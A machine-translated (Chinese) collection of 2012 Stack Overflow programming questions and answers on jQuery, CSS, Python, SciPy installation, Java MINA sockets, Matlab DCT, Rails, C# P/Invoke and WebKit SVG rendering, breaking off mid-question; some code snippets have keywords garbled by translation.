> 赞同：3
> 
> 时间：2012-11-21T11:03:16.417
> 
> 标签：jquery

我有带有格式的 html 表格

```
<div id="divOutputWindow">
<table>
<tbody>
<tr>
<td>/* Set Width 10 Px */ </td>
<td>/* Set Width 20 Px */ </td>
</tr>
<tr>
/* Same for all tr */
</tr>
</tbody>
</table>
</div> 
```

即第一个 td 的宽度为 10 px 下一个 td 15 px 下一个 td 20 px ...同样

我试过的是

```
$('#divOutputWindow').find('table').$('tbody > tr > td').css('width', '10px'); 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-21T11:12:41.520

尝试这个

```
$('div#divOutputWindow table tr td').eq(0).css('width','10px');
$('div#divOutputWindow table tr td').eq(1).css('width','20px'); 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-11-21T12:27:42.720

*   循环遍历每个`<td>`内部的`#divOutputWindow`.
*   `.each();`为此，在循环中，您可以通过`$(this)`.
*   定义最小值和步长，`$(this).index();`用于计数。
*   然后使用`.css('attr','value');`命令来操作你当前的`<td>`. 它是 css 属性的设置器。别忘了放在`"px"`最后。

编码：

```
$('#divOutputWindow td').each(function() {
    var min = 10;                                  // Define a minimum
    var step = 5 * $(this).index();                // Define Step(your step is 5 here)
    $(this).css('width', (min + step) + "px");     // css attribute of your <td> width:15px; i.e.
}); 
```

它奏效了吗？

***编辑：我看到@billyonecan 已经发布了类似的东西，测试两个例子，我的作品（我测试过）***

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-11-21T11:24:27.680

您可以使用：

```
$('#divOutputWindow td').attr('width', 10); 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-11-21T11:05:50.547

为什么不使用 CSS3 伪类？

喜欢

```
td:first-child
{
    width: 10px;
} 
```

[http://reference.sitepoint.com/css/css3psuedoclasses](http://reference.sitepoint.com/css/css3psuedoclasses)

# 编辑

[提琴手](http://jsfiddle.net/jfDb9/)

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2012-11-21T11:17:25.463

我认为您对这个效果很好的产品感兴趣：http: [//jsbin.com/ojunor/1/edit](http://jsbin.com/ojunor/1/edit)

```
$('#divOutputWindow table tr').each(function(){
    $('td:eq(0)',this).attr({"width":"10"}).text('10');
    $('td:eq(1)',this).attr({"width":"20"}).text('20');
}); 
```

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2012-11-21T11:15:26.607

我想这就是你的意思。基本上，循环你`<td>`的，并设置与元素索引相关的宽度，例如：

```
$('#divOutputWindow td').each(function() {
  var step = 5; $td = $(this);
  $td.width(10 + (step * $td.index()));
}); 
```

你基本上最终得到：

```
<tr>
  <td style="width: 10px;"> ... </td>
  <td style="width: 15px;"> ... </td>
  <td style="width: 20px;"> ... </td>
</tr> 
```

.. 等等

[这是一个小提琴](http://jsfiddle.net/9NjCH/)

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2012-11-21T11:16:53.047

不过，理想情况下，最好使用 css（伪）类来完成，您可以使用以下代码：

```
// Cache the td selector
var $td = $('#divOutputWindow table tr td');

$td.eq(0).width(10);
$td.eq(1).width(20);
... 
```

这是一个工作的[jsbin](http://jsbin.com/isuwes/1/edit)

# html - 限制CSS中的背景位置

> ID：13491863
> 
> 赞同：2
> 
> 时间：2012-11-21T11:03:47.843
> 
> 标签：html, css

是否可以将背景的 y 位置指定为“中心”，同时为其设置一个限制，以便实际的 y 位置不会超过某个特定值？

假设图像高度为 50px。我们将限制设置为 25px。如果容器的高度为 70px，则背景 y 位置为 10px。容器扩展为 100 像素，背景图像垂直定位为 25 像素。容器进一步扩展至 150px，背景 y 位置保持不变，即 25px。

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-21T12:28:30.080

您可以使用 javascript 执行此操作。[http://jsfiddle.net/jfPP3/](http://jsfiddle.net/jfPP3/)（在css中改变容器的高度很有趣）

```
var limit = 25; // you define your limit here
var container = document.getElementById('contain1');
var image = document.getElementById('img1');
var y = Math.round((container.offsetHeight - image.offsetHeight)/2);
if(y > limit){
    y = limit;
}
image.style.top= y + 'px'; 
```

只需定义一个限制，获取包含和图像的高度，然后`y`使用您的限制检查结果。最后定义图像的位置。

在我的示例中，我将图像设置为`position:absolute`，但您也可以简单地更改`top-margin`图像的 。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-21T11:10:19.020

你可以这样做`image sprite`

请参阅此链接[http://www.w3schools.com/css/css_image_sprites.asp](http://www.w3schools.com/css/css_image_sprites.asp)

# python - 替换 Python 中的特殊字符

> ID：13491867
> 
> 赞同：0
> 
> 时间：2012-11-21T11:03:52.777
> 
> 标签：python

如何用逗号替换 Python2.7 中的这些字符：

| •</p>

像这样的东西不起作用：

```
a= b.replace("|", ",") 
```

谢谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-21T11:08:41.567

使用包含要替换的字符列表的正则表达式

```
import re
a = re.sub(u'[|•]', ',', a) 
```

**句法：**

```
re.sub(pattern, repl, string, max=0) 
```

此方法用 repl 替换字符串中所有出现的 RE 模式，除非提供了*max* ，否则替换所有出现。

编辑您必须在源文件的顶部声明它使用 Unicode 文字。

```
# -*- coding: utf-8 -*- 
```

**还使用u**搜索前缀字符串

 **```
a = u"6• 918417•12"
a = re.sub(u"[|•]", ",", a) 
```**

# python - 使用 apt-get 在 Ubuntu 中安装 SciPy 0.11 版

> ID：13491868
> 
> 赞同：2
> 
> 时间：2012-11-21T11:04:08.940
> 
> 标签：python, scipy

> **可能重复：** [使用 pip 安装 SciPy](https://stackoverflow.com/questions/2213551)

我想安装一个新版本的 SciPy，它是 0.11.0，我拥有的当前版本是 0.9.0。

它是通过以下命令安装的：

```
sudo apt-get install python-scipy 
```

我曾尝试从源代码安装 0.11.0，但我不能。

是否已经有 0.11.0 的 apt-get 了？

**编辑 1**

以下是我从源代码构建或进行简单安装时的错误。

```
Setup script exited with error: Command "/usr/bin/g77 -g -Wall -g -Wall -shared
build/temp.linux-x86_64-2.7/build/src.linux-x86_64-2.7/scipy/fftpack/_fftpackmodule.o
build/temp.linux-x86_64-2.7/scipy/fftpack/src/zfft.o build/temp.linux-x86_64-
2.7/scipy/fftpack/src/drfft.o build/temp.linux-x86_64-2.7/scipy/fftpack/src/zrfft.o
build/temp.linux-x86_64-2.7/scipy/fftpack/src/zfftnd.o build/temp.linux-x86_64-
2.7/build/src.linux-x86_64-2.7/scipy/fftpack/src/dct.o build/temp.linux-x86_64-
2.7/build/src.linux-x86_64-2.7/fortranobject.o -Lbuild/temp.linux-x86_64-2.7 -
ldfftpack -lfftpack -lg2c -o build/lib.linux-x86_64-2.7/scipy/fftpack/_fftpack.so"
failed with exit status 1
/usr/lib/pymodules/python2.7/numpy/distutils/misc_util.py:251: RuntimeWarning: Parent
module 'numpy.distutils' not found while handling absolute import
from numpy.distutils import log 
```

**编辑 2**

该问题已解决，现在错误如下。

```
 gcc: build/src.linux-x86_64-2.7/scipy/fftpack/_fftpackmodule.c
   /usr/bin/g77 -g -Wall -g -Wall -shared build/temp.linux-x86_64-2.7/build/src.linux-
   x86_64-2.7/scipy/fftpack/_fftpackmodule.o build/temp.linux-x86_64-
   2.7/scipy/fftpack/src/zfft.o build/temp.linux-x86_64-2.7/scipy/fftpack/src/drfft.o
   build/temp.linux-x86_64-2.7/scipy/fftpack/src/zrfft.o build/temp.linux-x86_64-
   2.7/scipy/fftpack/src/zfftnd.o build/temp.linux-x86_64-2.7/build/src.linux-x86_64-
   2.7/scipy/fftpack/src/dct.o build/temp.linux-x86_64-2.7/build/src.linux-x86_64-
   2.7/scipy/fftpack/src/dst.o build/temp.linux-x86_64-2.7/build/src.linux-x86_64-
   2.7/fortranobject.o -Lbuild/temp.linux-x86_64-2.7 -ldfftpack -lfftpack -lg2c -o
   build/lib.linux-x86_64-2.7/scipy/fftpack/_fftpack.so
   /usr/bin/ld: cannot find -lgcc_s
   collect2: ld returned 1 exit status
   /usr/bin/ld: cannot find -lgcc_s
   collect2: ld returned 1 exit status
   error: Command "/usr/bin/g77 -g -Wall -g -Wall -shared build/temp.linux-x86_64-
   2.7/build/src.linux-x86_64-2.7/scipy/fftpack/_fftpackmodule.o build/temp.linux-
   x86_64-2.7/scipy/fftpack/src/zfft.o build/temp.linux-x86_64-
   2.7/scipy/fftpack/src/drfft.o build/temp.linux-x86_64-2.7/scipy/fftpack/src/zrfft.o
   build/temp.linux-x86_64-2.7/scipy/fftpack/src/zfftnd.o build/temp.linux-x86_64-
   2.7/build/src.linux-x86_64-2.7/scipy/fftpack/src/dct.o build/temp.linux-x86_64-
   2.7/build/src.linux-x86_64-2.7/scipy/fftpack/src/dst.o build/temp.linux-x86_64-
   2.7/build/src.linux-x86_64-2.7/fortranobject.o -Lbuild/temp.linux-x86_64-2.7 -
   ldfftpack -lfftpack -lg2c -o build/lib.linux-x86_64-2.7/scipy/fftpack/_fftpack.so"
   failed with exit status 1 
```

**编辑 3**

我已经问过这个问题[[here]](https://askubuntu.com/questions/220282/how-to-solve-the-link-library-problem-lgcc-s)，但问题尚未解决。

有什么想法吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-21T16:38:13.757

如果您已按照 INSTALL.txt 文件中的说明安装了所有基本先决条件，那么通过执行以下操作应该相当简单：

```
sudo python setupy.py install 
```

从您提取`scipy0.11.0`tarball 的目录中。这应该使该库位于您当前的默认 Python 版本中。

您可以通过运行来检查您是否具备先决条件：

```
sudo apt-get install python python-dev libatlas3-base-dev gcc gfortran g++ 
```

正如 INSTALL.TXT 中再次解释的那样。

# python-2.7 - 对 12 个千兆文本文件的出现次数进行排序和计数

> ID：13491871
> 
> 赞同：2
> 
> 时间：2012-11-21T11:04:09.193
> 
> 标签：python-2.7

我想通过计算每一行的出现来对一个大文本文件（大约 12 Giga）进行排序。为此，我使用过：

```
sort file.txt | uniq -c > sorted 
```

但由于几何膨胀，它需要永远。任何的想法？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-21T11:28:49.200

```
from collections import defaultdict

d = defaultdict(int)

with open(file.txt) as f:
    for line in f:
        d[line]+=1 
```

d 现在包含一个字典，其中每个键是唯一的行，值是该行的计数。

# c++ - 无符号字符减法效率

> ID：13491872
> 
> 赞同：1
> 
> 时间：2012-11-21T11:04:10.410
> 
> 标签：c++, c

我有很多文件（大约 50MB），其中包含 0 到 255 之间的数字。

我将它们加载为无符号字符。当我在它们之间执行减法时会发生什么？即使没有溢出，结果也始终是整数（sizeof() 给出 4）。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-21T11:09:44.637

正式地将它们提升为（在小于`int`的普通机器上），然后执行算术运算。`char``int`

在实践中，编译器可能会注意到结果被转换回`char`，因此只发出字节大小的机器代码。

关于效率，如果重要，则**衡量**。

# grep - 用于计算输出模式之间行数的 Unix 脚本

> ID：13491874
> 
> 赞同：0
> 
> 时间：2012-11-21T11:04:16.583
> 
> 标签：grep, wc

我正在尝试编写一个 unix 代码，我将在其中计算行数之间的行数（即此处为 2）

二`"|DATE and TIME | XXXXXX |"`

有什么方法可以结合使用 egrap 和 wc -l

输出：

```
|-------------------------------|

|DATE and TIME         | XXXXXX |

|-------------------------------|

| 21-NOV-2012 15:56:51 | 1259   |

| 21-NOV-2012 15:56:51 | 1364   |

|-------------------------------|

|DATE and TIME         | XXXXXX |

|-------------------------------|

| 21-NOV-2012 16:06:55 | 1259   |

| 21-NOV-2012 16:06:55 | 1364   |

|-------------------------------| 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-21T11:27:50.060

如果预期结果是 9（因为您的示例中有空行，我不知道是否应该计算它们）：

```
awk '/DATE and TIME/&&!f{f=1;next;}/DATE and TIME/&&f{print x;exit;}f{x++}' file 
```

# java - 客户端的传统 IO 和服务器中的 NIO，如果客户端在同一个套接字中发送多个消息，我如何获得特定的消息？

> ID：13491876
> 
> 赞同：0
> 
> 时间：2012-11-21T11:04:22.767
> 
> 标签：java, sockets, nio, apache-mina

我在服务器端使用 Apache Mina。我有一个用传统 IO 编写的客户端。这是将数据发送到服务器的客户端代码。

```
class SomeClass extends Thread
{
    Socket socket;

    //Constructor
    SomeClass()
    {
        Socket socket = ...
    }

    public void run()
    {
        while (j++ & lt; 10)
        {
            System.out.println("CLIENT[" + clientNo + "] Send Message =>" + requests[clientNo][j]);
            OutputStream oStrm = socket.getOutputStream();
            byte[] byteSendBuffer = (requests[clientNo][j]).getBytes();
            oStrm.write(byteSendBuffer);
            oStrm.flush();
        }
    }
} 
```

上面的线程运行了 20 次。因此创建了 20 个套接字。在 1 个套接字中，发送了许多消息。通过使用 IO 套接字类编写的服务器，我能够完美地检索数据。

问题出现在使用 BUFFER 的基于 Apache Mina 的服务器中！我无法收到个别消息。

我如何获取单个消息（鉴于我无法更改客户端中的任何内容，并且单个消息的长度未知）

**服务器端代码**
*套接字创建*

```
    public static void main(String[] args) 抛出 IOException，SQLException {           
        System.out.println(Charset.defaultCharset().name());
        IoAcceptor 接受器 = new NioSocketAcceptor();
        ProtocolCodecFilter(charset.newEncoder(),charset.newDecoder() ));
        acceptor.setHandler(新的 TimeServerHandler());
        acceptor.getSessionConfig().setReadBufferSize(64);
        acceptor.getSessionConfig().setIdleTime(IdleStatus.BOTH_IDLE, 10);
        acceptor.bind(new InetSocketAddress(PORT));
    }

```

*处理程序代码*

```
    公共无效消息接收（IoSession 会话，对象消息）抛出异常 {
            AbstractIoBuffer bf = (AbstractIoBuffer) 消息；
            Charset charset = Charset.forName("UTF-8");
            CharsetDecoder 解码器 = charset.newDecoder();
            String outString = bf.getString(decoder);

    }

```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-21T22:52:15.537

> 如何获取个人消息

你没有。TCP 中没有消息之类的东西。它是一个字节流协议。没有消息边界，也不能保证在另一端一次读取等于一次写入。

> （鉴于我无法更改客户端中的任何内容，并且单个消息的长度未知）

您将不得不解析消息以根据应用程序协议的定义找到它们停止的位置。如果因为协议不明确而无法做到这一点，那么客户端将不得不被丢弃。但是，由于您无法更改客户端，它似乎已经可以与现有系统一起使用，因此您之前的那个人遇到了同样的问题并以某种方式解决了它。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-21T11:36:24.023

MINA 实际上是一个非常精细的框架，可以优雅地解决您的问题。其基本概念是过滤器链，其中对传入消息应用一系列过滤器。

您应该实现一个协议解码器（实现`MessageDecoder`）并将其注册到您的 MINA 过滤器链中。该解码器应该将字节缓冲区解析为您选择的对象表示。

然后，您可以注册一个处理完整消息的消息处理程序。

# sql - 从非标量 VBA 函数中选择

> ID：13491892
> 
> 赞同：1
> 
> 时间：2012-11-21T11:05:17.190
> 
> 标签：sql, vba, ms-access

我可以像这样在 SQL 查询中使用标量 VBA 函数

```
SELECT vba_concat(name, surname) FROM persons 
```

我也可以像这样在 SQL 查询中使用非标量 SQL 函数

```
CREATE FUNCTION names() RETURNS TABLE(name VARCHAR(20)) AS '
    SELECT name FROM persons;
' LANGUAGE SQL;

SELECT * FROM names(); 
```

但是我怎样才能在这样的 SQL 查询中使用非标量**VBA**`SELECT * FROM vba_ids()`函数，其中`vba_ids()`定义为`Public Function vba_ids() As ADODB.Recordset`.

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-21T12:15:12.673

Access由两部分组成，编码端和数据库端。数据库通常是 Jet/ACE，但也可以是大多数其他数据库。当您引用 VBA 时，您将数据从 RAD 工具传递到数据库，因此您不能传递这样的记录集。

# matlab - Matlab：创建我自己的 dct2

> ID：13491895
> 
> 赞同：-2
> 
> 时间：2012-11-21T11:05:29.100
> 
> 标签：matlab

==问题解决了==

此代码将为您提供 dct2 输出。

我正在努力改进我自己的代码

谢谢你。

```
%Get the size of the input image
[m, n] = size(image);
output = zeros(m,n);

for u = 0:m-1
    for v = 0:n-1
        if u==0
            a=sqrt(1/8);
        else
            a=sqrt(2/8);
        end

        if v==0
            b=sqrt(1/8);
        else
            b=sqrt(2/8);
        end

        temp = 0;
        for x = 0:m-1
            for y = 0:n-1
                temp = (cos((((2*x)+1)*pi*u)/(2*m))*cos((((2*y)+1)*pi*v)/(2*n)));
            end
        end

        output(u+1,v+1) = a*b*temp;
    end
end 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-21T15:17:57.710

如果您尝试将其与 Matlab 函数进行比较，则您的代码存在两个问题`dct2`。作为记录，您可以打开并分析文件以了解 Matlab 正在做什么。

在这两种情况下，您都没有遵循以下公式：

1.  a 和 b 必须是 n 的函数：

    ```
    if u==0
        a=sqrt(1/n);
    else
        a=sqrt(2/n);
    end

    if v==0
        b=sqrt(1/n);
    else
        b=sqrt(2/n);
    end 
    ```

2.  您需要将您的`temp`术语乘以图像值（您没有这样做）：

    ```
    temp = temp+(image(x+1,y+1))*(cos((((2*x)+1)*pi*u)/(2*m))*cos((((2*y)+1)*pi*v)/(2*n))); 
    ```

我还没有解决性能问题，你真的应该自己研究一下。

# ruby-on-rails - 多次单击“添加到购物车”时显示多个购物车

> ID：13491896
> 
> 赞同：0
> 
> 时间：2012-11-21T11:05:29.353
> 
> 标签：ruby-on-rails

我一直在遵循“使用 Rails 进行敏捷 Web 开发”一书中的指南。第 11 章“添加一点 Ajax”。我不知道为什么当我点击添加到购物车 3 次时，左侧栏显示 3 个购物车，如果我点击 4 次，则显示 4 个购物车...

我不知道这个错误在哪里。

*应用程序.html.erb*

```
 <% if @cart %>
                <%= hidden_div_if(@cart.line_items.empty?, :id => 'cart') do %>
                <%= render @cart %>
                <% end %>
               <% end %> 
```

*存储/索引*

```
<%= button_to 'Add to cart', line_items_path(:product_id => product), 
:remote => true %> 
```

_line_item.html.erb

```
<div class="cart_title">Your Cart</div>
<table>

<% for item in @cart.line_items %>

    <% if line_item == @current_item %>
    <tr id="current_item">
    <% else %>
    <tr>
    <% end %>
<tr>
<td><%= item.quantity %>&times;</td>
<td><%= item.product.title %></td>
<td class="item_price"><%= number_to_currency(item.total_price) %></td>
</tr>
<% end %>
<tr class="total_line">
<td colspan="2">Total</td>
<td class="total_cell"><%= number_to_currency(@cart.total_price) %></td>
</tr>
</table>
<%= button_to "Checkout", new_order_path, :method => :get %>
<%= button_to 'Empy cart', @cart, :method => :delete,
:confirm => 'Are you sure?' %> 
```

_cart.html.erb

```
<%= render(cart.line_items) %> 
```

/ *--------侧边栏----------* /

您的购物车

1× 书 1 $10.00

1× Book2 $10.00 总计 $20.00

您的购物车

1× 书 1 $10.00

1× Book2 $10.00 总计 $20.00

您的购物车

1× 书 1 $10.00

1× Book2 $10.00 总计 $20.00

**家**

**订单**

**产品**

**用户**

# ruby-on-rails - 如何使用 Iron_worker 在 Iron.io 上要求“pg”gem

> ID：13491897
> 
> 赞同：3
> 
> 时间：2012-11-21T11:05:30.793
> 
> 标签：ruby-on-rails, ruby, ironworker, iron.io

.worker 文件

```
runtime "ruby"
name "UserMailer"
merge_gem "activerecord", "=3.2.8"
merge_gem 'actionmailer', '=3.2.8'
merge_gem 'devise', '=2.1.2'
merge_gem 'pg', "=0.14.0"
merge_file "../app/views/user_mailer/new_user.html.erb" , "user_mailer"
merge_file "../app/mailers/user_mailer.rb"
merge_dir "../app/models"
merge_exec "user_mailer_worker.rb" 
```

.rb 文件

```
require 'action_mailer' 
require 'active_record' 
require 'pg'
require 'bcrypt'
require 'devise'
require 'user_mailer.rb'
require 'models/user.rb' 

def init_mailer
  #Need to convert to proper hashes
  mailer_config = params['mailer'].inject({}) { |memo, (k, v)| memo[k.to_sym] = v; memo }
  # set default views dir to current dir
  ActionMailer::Base.prepend_view_path('.')
  ActionMailer::Base.smtp_settings = mailer_config
  ActionMailer::Base.delivery_method = :smtp
end

def setup_database
  puts "Database connection details:#{params['database'].inspect}"
  return unless params['database']
  # estabilsh database connection
  ActiveRecord::Base.establish_connection(params['database'])
end

init_mailer
setup_database
puts "I got '#{params.inspect}' parameters"
#send email!
# you could use here any active_record queries with models
UserMailer.new_user(User.find(params[:id])).deliver! 
```

我已将代码上传给铁工，但我得到了以下输出

```
Skipping ruby gem with name='pg' and version='0.14.0' as it contains native extensions, switching to full remote build should fix this 
```

在我在 Iron.io 上排队任务后，我得到了错误

```
/usr/local/lib/site_ruby/1.9.1/rubygems/custom_require.rb:36:in `require': cannot load such file -- pg (LoadError)
    from /usr/local/lib/site_ruby/1.9.1/rubygems/custom_require.rb:36:in `require'
    from /task/user_mailer_worker.rb:4:in `<top (required)>'
    from /usr/local/lib/site_ruby/1.9.1/rubygems/custom_require.rb:36:in `require'
    from /usr/local/lib/site_ruby/1.9.1/rubygems/custom_require.rb:36:in `require'
    from __runner__.rb:190:in `<main>' 
```

如何在 Iron.io 上要求“pg”宝石？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-21T11:24:20.380

将此行添加到 .worker 文件：

```
full_remote_build true 
```

# javascript - Javascript SDK 获取 facebook 好友列表成员

> ID：13491899
> 
> 赞同：-1
> 
> 时间：2012-11-21T11:05:35.017
> 
> 标签：javascript, facebook, facebook-javascript-sdk, facebook-fql

幸运的是，在尝试从 Facebook 帐户获取好友列表时，我得到了一些无法理解的响应，这就是我在 console.log 时得到的结果：

```
 #v_3 { __wrapped=#v_3, __observableEvents={...}, name="v_3", more...}

The method FB.Data.query:toString is not officially supported by Facebook and access to it will soon be removed. 
```

这是我的登录代码并获取用户的好友列表成员：

```
 FB.init({ appId:'my_appid' });

    // fetch the status on load
    FB.getLoginStatus(handleSessionResponse);

    $('#login').bind('click', function() {
        FB.login(handleSessionResponse);
    });

    $('#logout').bind('click', function() {
        FB.logout(handleSessionResponse);
    });

    // handle a session response from any of the auth related calls
    function handleSessionResponse() {
        FB.api('/me', function(response) {
            var access_token = FB.getAuthResponse()['accessToken'];
            console.log(access_token);
            console.log(response);
            var friends = FB.Data.query('SELECT uid, flid FROM friendlist_member WHERE flid IN (SELECT flid FROM friendlist WHERE owner=me())');
            console.log(friends);

            $('#user-info').html(response.id + ' - ' + response.name);
        });
    } 
```

有人遇到过同样的问题吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-21T11:11:10.937

好吧，有一个更好的方法来获取用户的好友列表：

```
FB.api('me/friends', function(response) {
   console.log(response);
} 
```

如果您真的想使用 FQL（在这种情况下这不是一个好方法），在此线程中解释了如何将 FQL 与 JavaScript SDK 一起使用：[如何使用 Facebook Graph API 执行 FQL 查询](https://stackoverflow.com/questions/2721927/how-can-i-execute-a-fql-query-with-facebook-graph-api)

获取朋友的正确 FQL 调用将是这个：

```
SELECT uid2 FROM friend WHERE uid1=me() 
```

> [https://developers.facebook.com/docs/reference/fql/](https://developers.facebook.com/docs/reference/fql/)

# c# - 关于 C# 中的 DllImport

> ID：13491900
> 
> 赞同：3
> 
> 时间：2012-11-21T11:05:40.097
> 
> 标签：c#, pinvoke

> **可能重复：**
> [Visual C++ 托管应用程序：找不到名为“添加”的入口点</a>](https://stackoverflow.com/questions/12884555/visual-c-managed-app-unable-to-find-an-entry-point-named-add)
> 
> [](https://stackoverflow.com/questions/12884555/visual-c-managed-app-unable-to-find-an-entry-point-named-add)

[](https://stackoverflow.com/questions/12884555/visual-c-managed-app-unable-to-find-an-entry-point-named-add)

[我正在学习在 C# 中使用平台调用。我按照](https://stackoverflow.com/questions/12884555/visual-c-managed-app-unable-to-find-an-entry-point-named-add)[msdn](http://msdn.microsoft.com/en-us/library/ms235636%28v=vs.80%29.aspx)上的教程进行操作：

它与 C++ 完美配合使用 MathFuncsDll.dll。

当我使用：

```
[DllImport("MathFuncsDll.dll")] 
```

在我的 C# 代码中，引发了一个 dll not found 异常。然后我将其更改为：

```
[DllImport("C:\\...\\MathFuncsDll.dll")] 
```

然后出现未找到入口点异常。

我该如何解决这些问题？

为澄清起见，这是我的代码：C++ dll：

头文件：

```
//MathFuncsDll.h

#ifdef MATHFUNCSDLL_EXPORTS
#define MATHFUNCSDLL_API __declspec(dllexport) 
#else
#define MATHFUNCSDLL_API __declspec(dllimport) 
#endif

namespace MathFuncs
{
    class MyMathFuncs
    {
    public:
    // Returns a + b
    static __declspec(dllexport) double Add(double a, double b);

    // Returns a - b
    static __declspec(dllexport) double Subtract(double a, double b);

    // Returns a * b
    static __declspec(dllexport) double Multiply(double a, double b);

    // Returns a / b
    // Throws DivideByZeroException if b is 0
    static __declspec(dllexport) double Divide(double a, double b);
    };
} 
```

.cpp 文件：

```
// MathFuncsDll.cpp
// compile with: /EHsc /LD

#include "MathFuncsDll.h"
#include <stdexcept>

using namespace std;

namespace MathFuncs
{
    double MyMathFuncs::Add(double a, double b)
    {
        return a + b;
    }

    double MyMathFuncs::Subtract(double a, double b)
    {
        return a - b;
    }

    double MyMathFuncs::Multiply(double a, double b)
    {
        return a * b;
    }

    double MyMathFuncs::Divide(double a, double b)
    {
        if (b == 0)
        {
            throw new invalid_argument("b cannot be zero!");
        }
    return a / b;
    }
} 
```

这是 C# 应用程序调用函数：

```
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;

namespace CSharpConsole
{
    class Program
    {
        //[DllImport("MathDll.dll")]

        [DllImport(@"C:\Users\...\Debug\MathDll.dll")]
        public static extern double Add(double a, double b);
        static void Main(string[] args)
        {
            double a = 6.2;
            int b = 3;

            Console.WriteLine(Add(a,b));
        }
    }
} 
```

我为此创建了一个全新的解决方案，第一个 DllIport 行仍然不起作用。第二行给出入口点异常。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-21T11:09:35.637

当你使用

```
[DllImport("MathFuncsDll.dll")] 
```

系统会在[DLL 搜索路径](http://msdn.microsoft.com/en-gb/library/windows/desktop/ms682586.aspx)中寻找 DLL 。搜索的第一个位置是包含您的可执行文件的目录。这是放置 DLL 的最佳位置。

如果您看到“未找到入口点”，则仅表示未找到入口点。

您链接到的文章不使用 p/invoke 链接到 C++ DLL。该文章描述了如何从托管 C++ 链接到本机 DLL。因此，由于您使用的是 C# 和 p/invoke，因此您似乎在做一些不同的事情。除非你提供你正在做什么的精确细节，例如代码，否则很难开出补救措施。

* * *

好的，现在您已经添加了一些代码。这很有帮助。

您不应该对 p/invoke 导出使用静态方法。删除`MyMathFuncs`并具有普通的旧 C 样式函数：

```
extern "C" 
{

    double __declspec(dllexport) Add(double a, double b)
    {
         return a + b;
    }
} 
```

不需要声明这些函数的头文件。只需一个 .cpp 文件即可完成。的使用`extern "C"`可以防止您的名字被 C++ 编译器破坏。

如果您需要检查 DLL 以查看它导出的内容，请使用 Dependency Walker。

在 C# 端使用：

```
[DllImport(@"...", CallingConvention=CallingConvention.Cdecl)]
public static extern double Add(double a, double b); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-21T11:12:24.070

您确定指定的 .dll 与您正在运行的可执行文件存在于同一文件夹中吗？因为这是 .NET 将首先搜索您的 .dll 的地方。如果在那里找不到，它将搜索 GAC。但我怀疑你把它放在那里。

也可能是权限问题（尽管不太可能），请参阅此问题以获取更多信息：[DllImport 生成 System.DllNotFoundException](https://stackoverflow.com/questions/3818482/dllimport-generates-system-dllnotfoundexception)

# css - Webkit 动画在其下方破坏 SVG

> ID：13491901
> 
> 赞同：3
> 
> 时间：2012-11-21T11:05:40.443
> 
> 标签：css, svg, webkit, css-animations

我在[jsfiddle做了一个示例页面](http://jsfiddle.net/6gvs4/1/)

如果我`sway`在元素上启用动画`#dog`并滚动页面，我会在 SVG 上看到大量条带。

如果我关闭动画（删除该`-webkit-animation-name`位），则条带消失并且 SVG 看起来应该（平滑）

有谁知道是什么导致了这个问题？有什么办法可以解决吗？

我只在 Webkit 浏览器（Chrome、Canary 和 OSX 上）中尝试过

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-22T06:34:04.800

好像是动画触发了GPU渲染梯度很差，这个bug可以通过简单的应用来`translate3d(0,0,0)`重现`#test`。[http://jsfiddle.net/LKmbN/](http://jsfiddle.net/LKmbN/)

除非[关闭 GPU 加速](http://jamisondance.com/post/22387219496/turning-off-gpu-acceleration-in-google-chrome/)，我能想到的唯一解决方法是通过 javascript 制作动画。希望有人能想出一些不那么痛苦的事情。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-26T09:31:27.783

我为此找到了一个*非常*hacky的解决方法。

基本上，您需要反复将宽度从原始宽度更改为原始负 1 像素，然后再变回来。

```
if($("#svgtest").css('width')=='15500px') {
    $("#svgtest").css('width','14499px');
} else {
    $("#svgtest").css('width','15500px');
} 
```

[你可以在这个 fiddle](http://jsfiddle.net/6gvs4/5/)看到它的作用。

请注意，虽然这是一个 hack，而不是真正的修复，但它确实解决了我遇到的 SVG 条带问题。

也许有人可以想出一个稍微不那么骇人听闻的解决方案来解决这个问题？

# wcf - 如何将数据类型从 RIA 服务导入 silverlight

> ID：13491902
> 
> 赞同：1
> 
> 时间：2012-11-21T11:05:43.060
> 
> 标签：wcf, web-services, silverlight, ria

我正在使用 RIA 服务将数据传输到我的 silverlight 应用程序，我将此服务的引用添加到我的 silverlight 应用程序。

我有一个返回这样的自定义类的方法

```
public class ReturnData
{
    /// <summary>
    /// detects if there is an error or not
    /// </summary>
    public bool Error
    {
        get;
        set;
    }
    /// <summary>
    /// If there is an error this contains the error
    /// </summary>
    public string ErrorMessage
    {
        get;
        set;
    }

    /// <summary>
    /// The Data
    /// </summary>
    public object Data
    {
        get;
        set;
    }
} 
```

我用它来告诉我的应用程序是否在操作中发生错误，并在错误或成功的情况下传递消息对象类型的数据字段用于包含返回的数据，它有时是字符串、整数、...或自定义对象。

问题是当我使用这样的服务时

```
ServiceReference1.Service1Client s = new ServiceReference1.Service1Client();
s.GetDirectoriesCompleted += new EventHandler<ServiceReference1.GetDirectoriesCompletedEventArgs>(s_GetDirectoriesCompleted);
